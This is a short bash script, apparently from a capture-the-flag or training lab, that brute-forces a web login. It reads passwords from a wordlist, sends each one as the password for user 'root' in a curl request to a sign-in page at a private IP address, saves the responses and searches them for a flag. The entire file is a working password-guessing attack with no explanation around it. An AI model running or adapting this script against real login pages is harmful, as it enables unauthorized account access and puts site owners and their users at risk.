#/bin/bash
for line in `cat dictionnary`
do
	echo $line
	curl 'http://10.11.200.162:80/?page=signin&username=root&password='$line'&Login=Login#' >> trash
	cat trash | grep flag
done
